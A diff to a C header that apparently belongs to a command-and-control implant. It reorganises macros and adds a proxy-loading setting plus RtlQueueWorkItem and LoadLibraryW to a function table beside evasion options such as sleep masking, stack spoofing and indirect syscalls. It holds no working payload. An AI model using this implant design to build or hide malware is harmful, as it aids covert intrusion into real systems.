@@ -10,6 +10,7 @@
 #include <Common/Native.h>
 #include <Common/Macros.h>
 #include <Common/Clr.h>
+#include <Common/Defines.h>
 
 #include <Core/Win32.h>
 #include <Core/Token.h>
@@ -26,28 +27,9 @@
 
 #include <Loader/CoffeeLdr.h>
 
-#define DEMON_MAGIC_VALUE 0xDEADBEEF
-
 #ifdef DEBUG
 #include <stdio.h>
 #endif
-
-#define WIN_VERSION_UNKNOWN 0
-#define WIN_VERSION_XP      1
-#define WIN_VERSION_VISTA   2
-#define WIN_VERSION_2008    3
-#define WIN_VERSION_7       4
-#define WIN_VERSION_2008_R2 5
-#define WIN_VERSION_2008_R2 6
-#define WIN_VERSION_2012    7
-#define WIN_VERSION_8       8
-#define WIN_VERSION_8_1     8.1
-#define WIN_VERSION_2012_R2 9
-#define WIN_VERSION_10      10
-#define WIN_VERSION_2016_X  11
-
-#define IMAGE_SIZE( IM ) \
-    ( ( ( PIMAGE_NT_HEADERS ) ( IM + ( ( PIMAGE_DOS_HEADER ) IM )->e_lfanew ) )->OptionalHeader.SizeOfImage )
 
 // TODO: remove all variables that are not switched/changed after some time
 typedef struct
@@ -111,6 +93,7 @@ typedef struct
             DWORD SleepMaskTechnique;
             BOOL  StackSpoof;
             BOOL  SysIndirect;
+            BYTE  ProxyLoading;
             BOOL  Verbose;
             PVOID ThreadStartAddr;
             BOOL  CoffeeThreaded;
@@ -161,6 +144,7 @@ typedef struct
         WIN_FUNC( RtlExitUserProcess )
         WIN_FUNC( RtlCreateTimer )
         WIN_FUNC( RtlRegisterWait )
+        WIN_FUNC( RtlQueueWorkItem )
         WIN_FUNC( RtlCreateTimerQueue )
         WIN_FUNC( RtlDeleteTimerQueue )
         WIN_FUNC( RtlCaptureContext );
@@ -204,6 +188,7 @@ typedef struct
         WIN_FUNC( NtQueryObject )
 
         // Kernel32
+        WIN_FUNC( LoadLibraryW )
         WIN_FUNC( CreateRemoteThread )
         WIN_FUNC( CreateToolhelp32Snapshot )
         WIN_FUNC( Process32FirstW )
